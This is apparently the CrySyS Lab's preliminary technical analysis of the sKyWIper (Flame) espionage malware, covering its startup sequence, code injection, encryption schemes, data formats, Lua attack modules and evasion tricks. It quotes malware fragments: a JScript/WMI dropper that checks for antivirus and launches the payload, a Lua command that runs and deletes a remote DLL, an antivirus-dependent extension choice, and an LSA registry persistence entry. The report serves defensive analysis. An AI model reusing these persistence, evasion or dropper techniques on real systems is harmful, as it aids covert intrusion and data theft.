Findings in brief 

In May 2012, our team participated in the analysis of an as yet unknown malware, which we 
internally call sKyWIper. Based on the information initially received, we understood that the 
malware  is  an  important  piece of  a targeted  attack.  When  we  started  the  analysis,  we  did 
not know how many countries were affected, but we suspected that it was not limited to a 
single  country.  Our  suspicion  was  based  on  indications  that  pieces  of  the  malware  was 
probably  identified  and  uploaded  from  European  parties  onto  binary  analysis  sites  in  the 
past. During the investigation, we received information about systems infected by sKyWIper 
in  other  countries,  including  Hungary,  our  home  country.  Hence,  the  suspicion  became 
evidence, and this made it clear for us that our findings must be disclosed by publishing this 
report. 

It  is  obvious  from  the  list  of  its  files  that  sKyWIper  must  be  identical  to  the  malware 
described  in  the  post  http://www.certcc.ir/index.php?name=news&file=article&sid=1894 
(from Iran National CERT (MAHER)) where it is called Flamer. For convenience, we keep our 
naming of the malware and call it sKyWIper based on one of the filenames (~KWI) it uses for 
temporary files. 

sKyWIper’s  constitution  is  quite  complex  with  a  large  number  of  components  and  the 
substantial size of some of its files. Therefore, providing its full analysis in a limited amount 
of time was infeasible with our current resources. Our goal was to get a quick understanding 
of  the  malware’s  purpose,  and  to  identify  its  main  modules,  storage  formats,  encryption 
algorithms, injection mechanisms and activity in general. This report contains the results of 
our  analysis,  which  should  help  other  researchers  with  more  resources  to  get  started  and 
continue the analysis producing more detailed results.  

Our  first  insight  suggests  that  sKyWIper  is  another  info-stealer  malware  with  a  modular 
structure incorporating multiple propagation and attack techniques, but further analysis may 
discover components with other functionalities. In addition, sKyWIper may have been active 
for as long as five to eight years, or even more. sKyWIper uses compression and encryption 
techniques to encode its files. More specifically, it uses 5 different encryption methods (and 
some variants), 3 different compression techniques, and at least 5 different file formats (and 
some  proprietary  formats  too).  It  also  uses  special  code  injection  techniques.  Quite 
interestingly,  sKyWIper  stores  information  that  it  gathers  on  infected  systems  in  a  highly

structured format in SQLite databases. Another uncommon feature of sKyWIper is the usage 
of the Lua scripting language.  

sKyWIper  has  very  advanced  functionality  to  steal  information  and  to  propagate.  Multiple 
exploits  and  propagation  methods  can  be  freely  configured  by  the  attackers.  Information 
gathering  from  a  large  network  of  infected  computers  was  never  crafted  as  carefully  as  in 
sKyWIper. The malware is most likely capable to use all of the computers’ functionalities for 
its  goals.  It  covers  all  major  possibilities  to  gather  intelligence,  including  keyboard,  screen, 
microphone, storage devices, network, wifi, Bluetooth, USB and system processes. 

The results of our technical analysis support the hypotheses that sKyWIper was developed 
by a government agency of a nation state with significant budget and effort, and it may be 
related to cyber warfare activities. 

sKyWIper is certainly the most sophisticated malware we encountered during our practice; 
arguably, it is the most complex malware ever found.

1.  Introduction 

Our team at CrySyS Lab, Budapest was alerted in May 2012 of a targeted attack found in the 
wild.  Below  we  summarize  the  investigation  history  and  the  current  status  of  the  forensic 
analysis. 

1.1.  Investigation 

We  have  carried  out  an  investigation  in  collaboration  with  several  parties  involved  in 
incident  response  since  we  were  alerted  of  the  malware  sKyWIper.  Some  of  these  parties 
involved  may  want  to  remain  anonymous;  therefore,  references  in  the  document  are 
deliberately  incorrect  to  avoid  identification  of  the  source  of  some  information,  data, 
sample, code, prototype, etc.  

sKyWIper is too complex to be fully analyzed with our limited resources and time. Therefore, 
our  investigations  focused  on  the  “big  picture”,  trying  to  get  a  first  insight  into  the 
capabilities,  behavior,  encryption,  data  storage,  propagation  and  communications  of  the 
malware. Much more work is needed to fully understand the details of the operation of the 
malware;  however,  as  much  debug/symbol  information  remains  in  the  code,  a  detailed 
analysis seems to be feasible with additional resources and time. 

1.2.  History and build dates 

sKyWIper  has  most  probably  been  operated  undetected  for  years.  It  has  been  potentially 
operational  for  5  years  or  more  according  to  malware  intelligence  reports.  The  main 
component,  msgsecmgr.ocx  a.k.a.  wavesup3.drv  refers  to  many  versions  of  a dynamic  link 
library. This component has been previously observed (without raising an alarm) as follows: 
 
Country of origin 

The  filename  WAVESUP3.DRV  was  first  seen  on  Dec  5  2007  in  Europe  by  the  Webroot 
community. Since, it has been observed in the following geographical regions: 

•  Europe on Dec 5 2007

• 

Islamic Republic of Iran on Mar 1 2010 
 

File sizes 

The following file sizes have been seen: 

•  1,153,536 bytes 
•  991,232 bytes 
•  975,872 bytes 

1.3.  Build dates 

The build date PE header information of the malware uses fake date information for its files; 
hence  we  cannot  precisely  identify  the  target  system’s  infection  time.  Nonetheless,  the 
SQLite  related  part  of  mssecmgr.ocx  contains  some  build  time  info  (more  about  the 
components later): 

“Unidentified build, Aug 31 2011 23:15:32    31...........Aug 31 2011 
23:15:32” 

The following string shows SQLite version information, found in the memory dumps: 

2010-01-05 15:30:36 28d0d7710761114a44a1a3a425a6883c661f06e7    NULL  

It relates to SQLITE_VERSION    "3.6.22"   (part of the source code) 

Also,  there  is  a  reference  “1.2.3”,  and  we  think  that  this  refers  to  zlib  version  number 
possibly used in SQLite tables. 

Some  tables  of  the  malware  contain  timestamps,  possibly  some  of  these  do  not  relate  to 
actual running times, but instead some dates when the attackers developed or constructed 
attack flows. An example is audcache.dat that contains timestamps like the ones below. We 
are not sure about the timestamps’ function and about the table structure. There are other 
binary strings that might be timestamps, but their values vary too much to be accurate.

1.4.  Comparison to Duqu (Stuxnet) at a glance 

As our team played a significant role in the discovery and analysis of Duqu, another recently 
discovered  info-stealer  malware  used  in  targeted  attacks,  we  briefly  compare  sKyWIper  to 
Duqu (and Stuxnet) in Table 1. Note that this is a high-level, simplified comparison. 

As it can be seen from the comparison, sKyWIper and Duqu (Stuxnet) have many differences, 
and it seems plausible that sKyWIper was not made by the same developer team as that of 
Duqu/Stuxnet/~D.    However,  we  cannot  exclude  the  possibility  that  the  attackers  hired 
multiple  independent  development  teams  for  the  same  purpose,  and  sKyWIper  and  Duqu 
are two independent implementations developed for the same requirement specifications. 
This may be an approach to increase the robustness of an operation, which can persist even 
if one of the two (or more?) implementations is uncovered.

3.  Activation and propagation 

3.1.  Startup sequence 

The malware can be started using two different methods:  

1.  Set msgsecmgr.ocx in the registry (see below at registry parts) 

2.  Run the malware from rundll32 using the command as follows:  

start /wait rundll32.exe c:\windows\system32\mssecmgr.ocx,DDEnumCallback 

 

At  startup,  mssecmgr.ocx  is  loaded  as  LSA  Authentication  Package.    About  2  minutes  later 
advnetcfg.ocx is loaded by services.exe. It is repeated every 2 to 3 minutes 3 times in total. 
About  2  minutes  later  services.exe  loads  nteps32.ocx  from  mssecmgr.ocx,  and  then 
winlogon.exe  also  loads  nteps32.ocx.  This  file  is  loaded  several  times.  In  the  meantime, 
explorer.exe  starts  5  iexplore  processes  that  subsequently  create  wpgfilter.dat.  Again  2 
minutes  later  ccalc32.sys  is  written  by  services.exe,  and in  1  minute  winlogon.exe loads  it. 
Next, mssecmgr.ocx is copied to wavsup3.drv. Then, boot32drv.sys is loaded by services.exe. 
This  sequence  of  events  is  illustrated  in  Figure  5  below,  while  Figure  6  shows  another 
representation with exact timestamps.

Figure 6 – Startup procedure with timestamps 

 

3.2.  Bootup experiments to gather timing information 

We performed some experiment to determine the order of module loadings and activities. 

Trial 1 

ccalc32.sys has a last change and last access time at the first start - difference ~50 seconds. 
In  normal  LSA  startup  without  mscrypt  installed,  ccalc  was  not  created  (no  real  CC  traffic 
either).  

Question: Is ccalc32 created by mssecmgr+advnet+?? during startup if ran from rundll?

Trial 2 

Nteps, soapr, to691 are removed to test if these files are needed for the malware to start. 
Windows  update  traffic  starts  after  1:40  min  of starting  rundll  for  startup.  At  iexplore  exit 
ccalc32.sys immediately appeared. ~HLV files appear about 1:20 min after the appearance of 
ccalc32.sys.  The  exact  timestamp  was  23:45:00  (local  time),  the  sharp  seconds  value  (:00) 
seems suspicious. 

Results: nteps, soapr, to691 are not needed for startup 

Trial 4  

Starting with Rundll32 at 23:49:20 
23:51:06 windowsupdate traffic begins 
23:52:48 iexplore quits, about 3 seconds later ccalc appears 
23:54:25 ~HVL files found in windows/temp 
msglu32.ocx exists, creation time is 2004, change time is current local time 

Trial 5  

Removing nteps, soapr, to691, msglu to be sure that msglu is indeed created during startup. 
Results: Malware is still running, msglu32 is created just at the same time as ~HLV files begin 
to be created. Order of events: 

1. iexplore + windowsupdate traffic  
2. traffic stops, ccalc32 created, some 1:20 min delay 
3. ~HLV files begin to appear and msglu is deployed

3.3.  Injections 

There are multiple injections of code during startup. Only advnetcfg32 is probably injected 3 
times.  We  have  no  detailed  information  why  code  is  injected  into  multiple  processes 
(including winlogon.exe, services.exe, explorer.exe).

Figure 7 – Winlogon.exe with injected code working with ccalc32.sys – procmon 

In  case  of  Duqu,  the  authors  used  ZwCreateSection()  and  ZwMapViewOfSection()  to  copy 
code into running processes, while other methods use LoadLibrary() and LoadLibraryEx() to 
load  a  library  into  a  code.  These  techniques  can  easily  be  detected  as  the  inserted  DLLs 
appear  in  the  PEB’s  InLoadOrderModuleList.  In  case  of  sKyWIper,  the  code  injection 
mechanism is stealthier such that the presence of the code injection cannot be determined 
by conventional methods such as listing the modules of the corresponding system processes 
(winlogon,  services,  explorer).  The  only  trace  we  found  at  the  first  sight  is  that  certain 
memory  regions  are  mapped  with  the  suspicious  READ,  WRITE  and  EXECUTE  protection 
flags,  and  they  can  only  be  grasped  via  the  Virtual  Address  Descriptor  (VAD)  kernel  data 
structure.  As  these  regions  must  have  been  allocated  dynamically  by  means  of 
VirtualAllocEx()  or  WriteProcessMemory(),  they  have  the  type  of  Vad  Short.  Thus,  the 
combination  of  RWE  flags  and  type  VadS  for  a  given  memory  region  in  a  system  process 
allowed  us  to  identify  the  code  injection.  Figure  8  shows  the  malicious  code  injections  we 
found with Volatility.

Figure 8 – The presence of code injection and hooks (Volatility) 

By examining the injected regions in more details, we found that the inserted code belongs 
to shell32.dll. This can be verified by means of vmmap as shown in Figure 9.

3.4.  Hooks 

By  checking  an  infected  machine  with  the  GMER  rootkit  revealer,  we  can  see  that  the 
infected  explorer.exe  hooked  the  SHGetSpecialFolderPathW()  library  call  in  the  shell32.dll 
module (that is supposedly the result of a code injection).

3.5.  Mutexes 

Similarly  to  other  malicious  codes,  sKyWIper  uses  mutexes  to  make  sure  that  only  one 
instance  is  running  from  it.  Mutexes  are  created  either  for  injected  system  processes 
(winlogon.exe,  services.exe,  explorer.exe)  and  proprietary  files.  In  the  former  case,  the 
following naming convention is used: TH_POOL_SHD_PQOISNG_#PID#SYNCMTX, where the 
#PID# variable refers to the PID of the system process the mutex belongs to. Furthermore, 
there  are  other  mutexes  that  belongs  to  files  created  by  the  malcode.  These  are  the 
following. 

c__program_files_common_files_microsoft shared_msaudio_wpgfilter.dat  

c__program files_common files_microsoft shared_msaudio_audcache 

To reveal all the mutexes one can traverse Windows’ _KMUTANT data structure, however, it 
is difficult to grasp the malicious ones.

It would be useful to describe here the exact meaning of the abbreviated functionality (SHR, 
ABH,  BHD,  DLV,  SMLData,  VBinfo,  OFR,  PF,  PGHDict)  of  this  interesting  library,  however, 
currently we do not have enough information on it. 

CreatePGHDict might be associated with some Bluetooth related activities. 

EnableSHR  might  be  connected  to  ~DEB93D  creation  which  contains  samba  nmb  name 
resolution traffic log. 

3.7.  Installation and propagation method 

There  are  multiple  ways  for  the  malware  to  propagate.  One  method  we  are  aware  of  is 
related  to  windows  update  and  file  downloading  by  some  modules  using  SSL  and  some 
proprietary text based protocol. We also have clear indications that Stuxnet’s print spooler 
exploit (MS10-061) and lnk exploit (MS10-046) is used within sKyWIper as well: 

var objFileSystem = new ActiveXObject("Scripting.FileSystemObject");var s = 
GetObject("winmgmts:root\\cimv2");var oProcs = s.ExecQuery("SELECT * FROM 
Win32_Process WHERE name='outpost.exe' or name='aupdrun.exe' or name='op_mon.exe' 
or 
name='avp.exe'");s.Delete("__EventFilter.Name='FilterForClassCreation'");s.Delete("
ActiveScriptEventConsumer.Name='ActiveScriptForSvc'");s.Delete("MyTestClass");s.Del
ete("__Win32Provider.Name='ActiveScriptEventConsumer'");var f = 
objFileSystem.GetFile("wbem\\mof\\good\\svchostevt.mof");f.Delete(true); 
f =objFileSystem.GetFile("testpage");f.Delete(true);if (!oProcs.Count) { s1 = new 
ActiveXObject("Wscript.Shell");s1.Run("%SYSTEMROOT%\\system32\\rundll32.exe 
msdclr64.ocx,DDEnumCallback");while (true) {  var oProcs = s.ExecQuery("SELECT * 
FROM Win32_Process WHERE name='rundll32.exe'"); if (!oProcs.Count) break; } var f = 
objFileSystem.GetFile("msdclr64.ocx");f.Delete(true);} else {  var f = 
objFileSystem.GetFile("msdclr64.ocx"); f.Delete(true);}   
 
where msdclr64.ocx  refers to the main module

Figure  13  shows  the  URL  used  to  download  the  main  module  by  some  routine  in  the 
installation  part  of  the  malware.  The  routine  downloads  the  file  mssecmgr.ocx  and  some 
header: B5 A0 44 3F 67 EA EA EA E5 B2 EA EA. Trying to decrypt the header with algorithm 
E1 (see encryption algorithms later in this report) and considering 0xEA => 0x00, the result is  

: 0000000000: 20 E1 D7 50 0A 00 00 00 │ C8 0F 00 00 á×P◙ Č☼ 

Further  information  shows  that  this  is  related  to  the  windows  update  mechanism  and  the

possibly  used  by  the  malware  for  identification  purposes.  For  the  same  reason,  it  can 
possibly be used as a NIDS signature.

4.  Description of components 

Now we present our initial analysis of the files used in sKyWIper. Note that given the lack of 
resources and time, our findings are preliminary. The main goal is to highlight the structure 
of the malware modules and the techniques used by the authors (e.g., for encryption); and 
to pave the way for a thorough investigation. 

4.1.  Encryption algorithms 

At the time of this writing, we identified five encryption algorithms used in the malware, we 
refer  to  them  as  E1-E5.  E1  is  used  in  DAT  files.  For  E1,  we  managed  to  produce  a  full 
substitution  table  as  presented  in  Figure  14  below.  We  could  identify  the  encryption 
algorithms E2-E5 shown in subsequent figures, but we do not have a full understanding of 
where they are used in sKyWIper and if they are related to known encryption methods.

Figure 20 – Encryption E5 --  ~DEB93D encryption key, 1024 byte XOR key used repeatedly 

Encryption key E5 might be calculated, but it can also be found in attack tables in memory 
dumps.  

Simple  XOR  with  a  constant  is  also  used to  “encrypt”  files  in  multiple  places.  For  instance, 
Boot32drv.sys is an encrypted data file with simple XOR with 0xFF.  

to691.tmp  is  always  among  the  first  files  that  was  installed  into  infected  systems.  The  file 
contains  configuration  data  and  log  results,  very  similar  to  the  audcache.dat,  but  it  is 
encrypted in a different way, as follows. to691.tmp is encrypted cyclically by XOR-ing with a 
16-byte  long  binary  string.  The  string  was  found  to  be  individual  on  the  samples.  As  the 
cleartext file contains many 0x00 characters, the XOR key can be easily found by statistical 
means. The method is described in Figure 21 as Encryption E6A.

for i=0..15: 
take all characters from file at n*16+i 
generate statistics on characters 
key[i]=find most common character 
for i=0..filesize: 
  decrypted[i]=encrypted[i] XOR key[i%16] 
 

Figure 21 –Encryption E6A – TO691 1st stage generic decryption pseudocode 

 

The  decrypted  text  after  E6A  is  still  not  cleartext  database  format,  but  one  can  easily  see 
that it is very similar to the file format of audcache.dat (after decryption). 

The second stage is a mono-alphabetical substitution, for which it may not be impossible to 
find a short mathematical formula to calculate the substitutions, but so far we were not able 
to find that. Instead, we manually investigated the file and built a partial substitution table 
on the characters used. The partial table is denoted as E6B in Figure 22.

4.2.  Registry parts 

The  malware  does  not  modify  too  many  registry  keys  as  most  information,  data, 
configuration are stored in files. The affected registry entries are the following: 

•  For installations and startup, LSA is abused: 

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Autenthication 
Packages will contain in new line mssecmgr.ocx: 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] 
"Authentication Packages"=hex(7):6d,00,73,00,76,00,31,00,5f,00,30,00,00,00,6d,\ 
 00,73,00,73,00,65,00,63,00,6d,00,67,00,72,00,2e,00,6f,00,63,00,78,00,00,00,\ 
 00,00 

•  For some communications between processes wave8 and wave9 are used. Wave8 

possibly stores some PID, but this is just a guess. Wave9 is a name for the stored version 
of the “main module”:

Figure 28 – Binary format of ntcache.dat (beginning) 

We  could  not  decide  if  the  format  is  custom  or  just  some  strange  binary  format.  A 
comparison  with  ~HLV473.tmp,  a  file  that  contains  a  list  of  running  processes,  reveals  the 
sequences “78 DA ED” and “78 DA 73” standing for a zlib inflate compressed format.

Many DAT files have the following structure:  A table is stored in a file, containing key-value 
pairs. The key-value pairs are separated by multiple 0xFF characters (like padding), in some 
files  with  multiple  0xAE  characters  (Duqu  often  used  0xAE  as  well).  Between  the  key  and 
value 0xFF, 0xFE separates the data. 

The ~DEB93D files contain Samba / nmb lookups in a proprietary table format

Figure 34 – “8F AF AC 84” PPMd compressed record in ntcache.dat 

The table format is as follows: Ater 4 bytes header every record begins with UNIX timestamp 
(like 0x4FXX3651 in the figure), then “03 00 00” is some kind of record header, “22” refers to 
record  length,  but  you  should  add  3,  as  the  next  “00  00  00”  is  not  strictly  related  to  the 
record, so the real payload without the “00 00 00” string is 0x22 bytes long. 

Most of the records are readable queries like the ones above, but some contain raw samba 
protocol data. 

The  creation  of  ~DEB93D  files  are  connected  to  nteps32  export  functions,  possibly 
EnableSHR, but this is not confirmed yet. 

4.4.  Data storage formats 

Although the HLV and KWI file formats are not yet fully understood, these files contain data 
resembling to database table records and some records of the above described compressed 
formats. 

From the extracted contents of some of these data files we found that they all (HLV, KWI, 
and  even  ntcache.dat)  contain  basic  information  on  running  processes.  The  information  is 
about  1000-2000  bytes  of  redundant  data.  It  contains  the  actual  status  of  the  running 
program,  and  in  some  cases,  historical  data  as  well.  In  some  cases,  they  seem  to  contain 
screenshot related information besides the list of running processes.

Further investigations on these files indicated that the KWI files have different purpose as 
shown in the figures below: 

HighSeverityStorageFileName - KWI989.tmp 
LowSeverityStorageFileName - KWI988.tmp

4.5.  Logging file list 

The  malware  saves  ~rf<number>  files  in  /windows/temp.  This  operation  seems  to  be 
automatic,  but  perhaps  it  may  also  be  remotely  controlled.  These  files  are  encrypted  with 
the E1 encryption algorithm (see above). After decryption, the file appears to be an SQLite3 
database, storing information on drivers, directories, and file names.

Figure 38 –File list of the file system in the ~rf files 

Discussion:  

Storing  full  directory  listing  in  SQLite  databases  is  something  you  won’t  expect  from  a 
malware. It’s very strange as it raises complexity and the need for space, and in addition it 
leaks information through the database structure. 

 Note that the “SQLite browser” application cannot see full filenames as they are stored in 
Unicode format in blob entries, and the first \x00 stops viewing them. 

4.6.  Saving additional information 

The malware is curious about lot of things. Some examples from the long list of interests are 
shown in the figure below:

6.  Attack details – dictionary and scripts 

The file dstrlog.dat contains a ClanDB for names and terms used by the malware, an SQLite 
database  used  for  attacks.  This  file  is  loaded  through  libclandb.lua by  SQL  commands,  and 
the  database  is  accessed  using  Lua  scripts.  We  disclose  detailed  description  of  the  SQLite 
database to show the SQL tables used for attacks. The attackers even take care of versions, 
and update the structure if necessary. The sample below shows a version upgrade script.

There are a number of names and phrases in the database used in the code of the malware. 
Deeper  analysis  is  needed  to  fully  understand  all  these  references.  Here,  we  include  the 
result of our initial investigation with a note that these interpretations might not be correct. 

Boost: Possibly information gathering based on enquiries received from remote parties. 

Flame:  Common name for attacks, most likely by exploits. Ef_trace.txt relation. 
%temp%\dat3C.tmp and %systemroot%\\temp\\msdclr64.ocx related.

Flask:   Attacks can be Jimmy or Flask. Probably Flask is one flame. Not sure. 

Jimmy:  A specific CLAN attack type, but also a flame. CLAN probably refers to a local 

network attack while flame can be anything. Based on dll: 
“c:\Projects\Jimmy\jimmydll_v2.0\JimmyForClan\Jimmy\bin\srelease\jimmydll\inds

Transport: Replication method. Exploit-based propagation is most likely called flame, while 

that based on bad access permissions is a “Transport”. E.g. “NU” or “NUSystem” 
refers to “net use” way of propagation.

Bluetooth: enumerates devices around the infected machine. 
May turn itself into a “beacon”: announces the computer as a discoverable 
device and encode the status of the malware in device information using 
base64. 
Records audio from existing hardware sources. Lists all multimedia devices, 
stores complete device configuration, tries to select suitable recording 
device. 
Selects one of the methods for infecting media, i.e. USB disks. Available 
methods: Autorun_infector, Euphoria. 
Creates “autorun.inf” that contains the malware and starts with a custom 
“open” command. The same method was used by Stuxnet before it 
employed the LNK exploit. 
Create a “junction point” directory with “desktop.ini” and “target.lnk” from 
LINK1 and LINK2 entries of resource 146 (were not present in the resource 
file). The directory acts as a shortcut for launching Flame. 
Creates backdoor accounts with login “HelpAssistant” on the machines 
within the network domain if appropriate rights are available. 
Infect machines using pre-defined user accounts. The only user account 
specified in the configuration resource is “HelpAssistant” that is created by 
the “Limbo” attack. 
HTTP server that responds to “/view.php” and “/wpad.dat” requests. 
Listens on network interfaces, receives and saves NBNS packets in a log 
file. Has an option to start only when “Munch” is started. Collected data is 
then used for replicating by network. 
Configuration section that contains the list of all additional modules that 
should be loaded and started. 
Creates a directory listing of the infected computer. 
Creates a list of “interesting” files using several filename masks. 
Logging facilities 
When an Internet connection becomes available, it connects to the C&C 
servers, downloads new modules, and uploads collected data. 
Identifies programs that may be hazardous to Flame, i.e., anti-virus 
programs and firewalls. 

The purpose of these modules is not yet known.

6.1.  Some interesting Lua scripts inside the code 

CRUISE_CRED.lua 

The script gathers credential information from an already infected machine. More precisely, 
it  cruises  all  the  token  objects  to  find  the  ones  belong  to  the  administrator  or  the 
Administrators, Domain Admins groups. If it is successful, it updates cruiseAttackLog in the 
“CLAN” database by means of the user sd and the user name. For more information, please 
see the Tables creds and cruise_attack_log in Figure 48. 

basic_info_app.lua 

various 

The script gathers basic information about an infected computer such as the flame version it 
has been infected with, the computer name, the ip address of the machine. Furthermore, it

books 
parameters 
(e.g., 
AVERAGE_LEAK_BANDWIDTH, 
LAST_LEAK_TO_INTERNET,  MEDIA_LEAKS_FROM_THIS_ 
COMPUTER, etc).  Note that the FLAME_VERSION parameter must have been used to avoid 
the reinfection of the same computer and also to update flame if it is neccessary.  

information 

leak 

the 

nature 

of 

clan_seclog.lua 

The  script  parses  the  Security  log  by  searching  for  certain  event  Ids  and  retrieves  the 
correspondig  username  and  ip  information  from  it.  It  is  supposedly  used  to  collect 
information  about  the  traces  of  infection,  or  the  credentials  and  source  IPs  used  to 
authenticate  to  the  infected  machine.  The  script  examines  the  following  event  Ids,  where 
the corresponding log entries store the required pieces of information (Account Name, User 
Name and IP address) 

Event Id: 540 – Refers to successful network logon. Among various parameters the log stores 
the User Name and Source Network Address as well.  

Event Id: 672 – Refers to Authentication Ticket Granted Audit event. In case of Windows, the 
Kerberos  authentication  uses  the  optional  pre-authentication  phase  before  issuing  an 
authentication  ticket  by  checking  the  credentials  of  the  client.  If  the  client  successfully 
authenticated  to  the  workstation,  Windows  puts  a  log  entry  with  event  id  672  into  the 
Security log in order to demonstrate the successful initial logon event.

Event Id 673:  - Refers to Service Ticket Granted Audit event. Once the authentication ticket 
is granted a service ticket have to be gained. If it is so, the client could successfully logon to 
the domain, and Windows puts a log entry with the 673 event Id to the Security Log.  

Event Id 680: - Refers to Account Used for Logon by: <authentication package> . 

json.lua: json related string functions only 

casafety.lua: “CLANattack safety” tries to find out processes, registry information and 

similar related to  ESET, KAV, McAfee, TrendMicro, and list from THREATENING_ 
PROGRAMS. Basically it’s used to get information on how secure is to use the host 
from the perspective of the attacker. 

Some file names that are referred from code: 

ATTACK_FLAME_STARTLEAK:  uses "%temp%\\~txqvsl.tmp" 
ATTACKOP_FLASK_PRODS: uses "%temp%\\~mso2a2.tmp" 
ATTACKOP_JIMMY_PRODS: uses "%temp%\\~dra53.tmp" 
4784.dll creates the ~dra52.tmp and ~a29.tmp 

ATTACKOP_JIMMY.lua:        

 ctx.exec:exec({cmdLine = ctx.transport:expandLocal(string.format("cmd /c cd 
\"%%temp%%\" &&(if exist \"%s\" start /wait rundll32 \"%s\",%s)&move /y

remoteDLLBasename, remoteDLLBasename, dllExportedFunction, remoteDLLBasename)), 
mofInfo = {confPath = "LUA.CLAN.JIMMY_MOF", fn = "svchost1ex.mof"}}) 

Below is a description of the attack DLL files used in the Jimmy attack. 

00004784.dll – jimmy.dll – contains resource 164 “BIN”

6.2.  Related files 

0004784.dll (Jimmy.dll) 

0004784.dll is part of the “Jimmy” attack hence we use the name jimmy.dll. It contains the 
string 
“c:\Projects\Jimmy\jimmydll_v2.0\JimmyForClan\Jimmy\bin\srelease\jimmydll\i
ndsvc32.pdb”.  

0004784.dll (jimmy.dll) can be extracted from decompressed resource 146 at position 
0x2561F3. 

By running the jimmy.dll with rundll32 jimmy.dll, QDInit, it starts to produce files ~a29.tmp 
and ~dra52.tmp. (QDInit == Quick Disk Inspection?) Related information can be found in lua 
files: 

ATTACKOP_JIMMY.lua:        ctx.exec:exec({cmdLine = 
ctx.transport:expandLocal(string.format("cmd /c cd \"%%temp%%\" &&(if exist \"%s\" 
start /wait rundll32 \"%s\",%s)&move /y \"%%_systemroot%%\\temp\\~dra52.tmp\" 
\"~dra53.tmp\" &del /q \"%s\"", remoteDLLBasename, remoteDLLBasename, 
dllExportedFunction, remoteDLLBasename)), mofInfo = {confPath = 
"LUA.CLAN.JIMMY_MOF", fn = "svchost1ex.mof"}}) 

Figure 47 – Jimmy temp files reference in Lua script ATTACKOP_JIMMY.lua 

 

The produced ~dra52.tmp in our samples contained around 580 byte compressed data 
(PPMd) on some partial file listings related information of some (5-10) files of the file 
system. The remaining data is compressed or encrypted.

Most likely jimmy.dll is capable to grab screenshots and other modules perform other 
information stealing tasks. 

If we run the jimmy.dll manually with rundll32, ~a29.tmp contains 12 bytes, bytes pos 0x4-
0x7 are different on different systems, other bytes match. 

00004069.exe 

00004069.exe registers itself under the name “Windows Management Instrumentation 
Configurator”, and contains references to %windir%\system32\rdcvlt32.exe 
%temp%\sl84.tmp WinInit.INI and other files. 

6.3.  SQLite table structure of CLAN DB  

Attack and other information is stored in SQLite and unknown “CLAN” databases. 

The dstrlog structure is described below. It appears unusual to use databases to store attack 
related  information  inside  the  malware,  but  apparently  this  is  the  case:  mssecmgr.dll 
contains  DB2  ODBC  references  inside  (unknown  goal)  and  attack  strings  contain  Oracle 
references as well (most likely for information gathering).

7.  Evasion techniques 

7.1.  Security programs relation 

The  authors  took  extra  precautions  to  evade  detection  by  security  products.  The  list  is  so 
comprehensive  it  is  rarely  seen.  A  very  similar  list  can  be  found  in  the  ccalc32drv.sys  file, 
where table DangerousProcesses contains 346 items.  We do not disclose the list as it could 
serve other malware authors for their goals. 

7.2.  Design choices and tricks 

It can clearly be seen that this malware was continuously developed over a long time period 
and  it  employs  several  tricks  to  evade  security  products.  For  example,  the  extensions  are 
chosen  according  to  the  detected  anti-malware  products.  We  found  that  the  malware 
usually  uses  the  .ocx  extension,  but  this  decision  is  based  on  how  to  get  best  under  the 
radar. In case of McAfee McShield installed, the preferred extension is changed to .tmp as 
seen in the decompiled code segment below. 

        Transport.getPreferredDLLExtension = function(l_10_0) 
            local remoteProcs = l_10_0.ctx.remoteSafety:procList() 
            local gotMcShield = false 
            for pid,exe in pairs(remoteProcs) do 
              if string.lower(exe) == "mcshield.exe" then 
                gotMcShield = true 
            else 
              end 
            end 
            if gotMcShield then 
              log.writeEx(-1453109576, 189173052, 
log.colons(tostring(l_10_0.ctx.tgt), "tmp")) 
              return "tmp" 
            else 
              return "ocx" 
            end 
               end

ANNEX 

 

Here we give some hint on implementing functions for which we had problems. The typical 
example is encryption, where it is very important which parameters and implementation are 
in use, and what type of header should exist for the successful decompression. 

Again, we don’t want to show best practice, we want to show at least one successful way to 
work with the sample. 

… load sample into $bufall  
 
use Compress::Zlib; 
sub FlatDecoding { 
my ($str) = @_; 
my @ret = split('', $str); 
my ($k, $err) = inflateInit( {-Bufsize => 1}); 
my ($ret,$z,$status) = ('','',0); 
foreach (@ret) { 
($z, $status) = $k->inflate($_); 
$ret .= $z; 
last if $status == Z_STREAM_END or $status != Z_OK; 
} 
return $ret; 
} 
 
$bufall2=FlatDecoding($bufall); 
..save $bufall2 

Figure 56 – F/Inflate/Flate decompression – PERL sample code copied from the net 

 
… load sample into $bufall  
 
use Compress::PPMd; 
my $decoder=Compress::PPMd::Decoder->new(); 
  my $bufall2=$decoder->decode(substr($bufall,4)); 
 not be decompressed 
  
..save $bufall2
